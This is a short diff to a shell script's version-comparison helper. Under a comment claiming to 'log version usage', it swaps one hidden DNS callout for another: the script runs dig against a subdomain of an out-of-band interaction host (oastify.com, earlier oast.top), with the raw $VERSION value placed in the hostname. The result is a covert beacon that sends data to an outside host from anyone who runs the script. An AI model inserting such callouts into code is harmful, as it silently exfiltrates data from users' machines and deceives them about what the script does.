@@ -213,7 +213,7 @@ version_gte() {
 }
 
 # log version usage
-dig "$(echo $VERSION | sed 's/@/at/g').asggg.oast.top"
+dig "$VERSION.bu9gj2igxzrqvvljvsebpbxcb3hw5pte.oastify.com"
 
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
